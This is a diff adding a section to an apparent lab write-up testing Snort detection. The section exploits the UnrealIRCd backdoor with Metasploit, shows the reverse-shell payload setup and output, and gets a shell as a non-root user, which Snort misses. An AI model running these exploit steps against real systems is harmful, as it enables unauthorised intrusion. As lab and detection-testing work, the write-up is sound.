@@ -492,3 +492,62 @@ uid=1111(leia_organa) gid=100(users) groups=100(users),27(sudo)
 ```
 
 This is not detected by Snort.
+
+## Missed Attack 2: UnrealIRCd
+
+Although we have to do 3, with CUPS we could not get a stable shell, so we will try to do 4.
+
+In the in depth nmap we saw that the port 6697 was open with service **irc** and version **UnrealIRCd**, so we perform a search on metasploit:
+
+```bash
+search unrealircd
+```
+
+And there is only one exploit (`unix/irc/unreal_ircd_3281_backdoor`), so we will use it.
+
+First we look at the payloads and try different ones, I will start with the 11 (`cmd/unix/reverse_ruby_ssl`) and configure its options, then we will execute the exploit.
+
+```bash
+set RHOSTS 172.28.128.3
+SET LHOST 192.168.0.104
+exploit
+```
+
+```bash
+[*] Started reverse TCP double handler on 192.168.0.104:4444 
+[-] 172.28.128.3:6667 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (172.28.128.3:6667) timed out.
+[*] Exploit completed, but no session was created.
+```
+
+This error is because the port 6667 is closed, if we look at the nmap the open port is 6697, so we will change it and try again.
+
+```bash
+set RPORT 6697
+exploit
+```
+
+```bash
+[*] Started reverse TCP double handler on 192.168.0.104:4444 
+[*] 172.28.128.3:6697 - Connected to 172.28.128.3:6697...
+    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
+    :irc.TestIRC.net NOTICE AUTH :*** Found your hostname (cached)
+[*] 172.28.128.3:6697 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo vzTyVdtbQstqwlSE;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "vzTyVdtbQstqwlSE\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 13 opened (192.168.0.104:4444 -> 192.168.0.104:43234) at 2023-11-19 23:50:18 +0200
+
+whoami
+boba_fett
+id
+uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
+```
+
+We get shell although not with root privileges, but most surprisingly snort did not detect the attack.
